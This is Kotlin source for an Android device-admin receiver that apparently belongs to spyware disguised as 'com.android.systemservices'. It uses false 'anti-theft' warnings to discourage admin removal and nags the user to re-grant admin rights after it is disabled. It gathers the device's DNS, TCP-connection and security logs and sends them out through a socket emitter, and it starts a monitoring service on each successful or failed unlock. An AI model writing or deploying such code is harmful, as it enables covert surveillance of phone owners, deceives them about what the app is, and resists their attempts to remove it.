package com.android.systemservices

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.admin.ConnectEvent
import android.app.admin.DeviceAdminReceiver
import android.app.admin.DevicePolicyManager
import android.app.admin.DnsEvent
import android.app.admin.SecurityLog
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.UserHandle
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

class DeviceAdminReceiver : DeviceAdminReceiver() {

    override fun onEnabled(context: Context, intent: Intent) {}

    override fun onDisableRequested(context: Context, intent: Intent): CharSequence =
        "Warning: Removing system admin rights will disable anti-theft protection. " +
        "Open System Services and enter your PIN to authorise this change."

    override fun onDisabled(context: Context, intent: Intent) {
        // Post a high-priority notification so the user can immediately re-enable
        val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val channelId = "sys_admin"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            nm.createNotificationChannel(
                NotificationChannel(channelId, "System Alert", NotificationManager.IMPORTANCE_HIGH)
            )
        }
        val adminIntent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                ComponentName(context, DeviceAdminReceiver::class.java))
            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Anti-theft protection requires admin rights to function.")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        val pi = PendingIntent.getActivity(
            context, 0, adminIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val notif = Notification.Builder(context, channelId)
            .setSmallIcon(android.R.drawable.ic_dialog_alert)
            .setContentTitle("System Services — Action Required")
            .setContentText("Anti-theft protection disabled. Tap to restore.")
            .setContentIntent(pi)
            .setAutoCancel(true)
            .setOngoing(false)
            .build()
        nm.notify(NOTIF_ID, notif)
    }

    override fun onNetworkLogsAvailable(context: Context, intent: Intent, batchToken: Long, networkLogsCount: Int) {
        val pending = goAsync()
        Thread {
            try {
                val dpm   = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val admin = ComponentName(context, this::class.java)
                val logs  = dpm.retrieveNetworkLogs(admin, batchToken) ?: return@Thread
                val arr   = JSONArray()
                for (event in logs) {
                    val obj = JSONObject()
                    obj.put("ts",  event.timestamp)
                    obj.put("pkg", event.packageName ?: "")
                    when (event) {
                        is DnsEvent -> {
                            obj.put("type",      "dns")
                            obj.put("hostname",  event.hostname ?: "")
                            obj.put("addresses", event.inetAddresses
                                ?.joinToString(", ") { it.hostAddress ?: "" } ?: "")
                        }
                        is ConnectEvent -> {
                            obj.put("type",    "tcp")
                            obj.put("address", event.inetAddress?.hostAddress ?: "")
                            obj.put("port",    event.port)
                        }
                    }
                    arr.put(obj)
                }
                SocketManager.emit("network_logs", JSONObject().apply { put("events", arr) })
            } catch (e: Exception) {
                android.util.Log.e("DeviceAdminReceiver", "networkLogs error: ${e.message}")
            } finally { pending.finish() }
        }.start()
    }

    override fun onSecurityLogsAvailable(context: Context, intent: Intent) {
        val pending = goAsync()
        Thread {
            try {
                val dpm   = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val admin = ComponentName(context, this::class.java)
                val logs  = dpm.retrieveSecurityLogs(admin) ?: return@Thread
                val arr   = JSONArray()
                for (event in logs) {
                    arr.put(JSONObject().apply {
                        put("ts",   event.timeNanos / 1_000_000L)
                        put("tag",  event.tag)
                        put("name", securityTagName(event.tag))
                        put("data", when (val d = event.data) {
                            null        -> ""
                            is Array<*> -> d.joinToString(", ") { it?.toString() ?: "" }
                            else        -> d.toString()
                        })
                    })
                }
                SocketManager.emit("security_logs", JSONObject().apply { put("events", arr) })
            } catch (e: Exception) {
                android.util.Log.e("DeviceAdminReceiver", "securityLogs error: ${e.message}")
            } finally { pending.finish() }
        }.start()
    }

    override fun onPasswordFailed(context: Context, intent: Intent, user: UserHandle) {
        triggerUnlockCapture(context, success = false)
    }

    override fun onPasswordSucceeded(context: Context, intent: Intent, user: UserHandle) {
        triggerUnlockCapture(context, success = true)
    }

    private fun triggerUnlockCapture(context: Context, success: Boolean) {
        val intent = Intent(context, MonitoringService::class.java).apply {
            action = if (success) ACTION_UNLOCK_SUCCESS else ACTION_UNLOCK_FAIL
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent)
        } else {
            context.startService(intent)
        }
    }

    companion object {
        const val ACTION_UNLOCK_SUCCESS = "com.android.systemservices.UNLOCK_SUCCESS"
        const val ACTION_UNLOCK_FAIL    = "com.android.systemservices.UNLOCK_FAIL"
        private const val NOTIF_ID = 9001

        private val tagNameCache = HashMap<Int, String>()

        // Reads /system/etc/event-log-tags at runtime so the name is always correct
        // for the actual Android version running on the device.
        fun securityTagName(tag: Int): String = tagNameCache.getOrPut(tag) {
            try {
                File("/system/etc/event-log-tags").useLines { lines ->
                    lines.firstOrNull { it.startsWith("$tag ") }
                        ?.substringAfter(" ")           // drop the number
                        ?.substringBefore(" (")         // drop data-format spec
                        ?.removePrefix("security_")     // drop common prefix
                        ?.replace('_', ' ')
                        ?.replaceFirstChar { it.uppercase() }
                } ?: "Tag $tag"
            } catch (_: Exception) { "Tag $tag" }
        }
    }
}
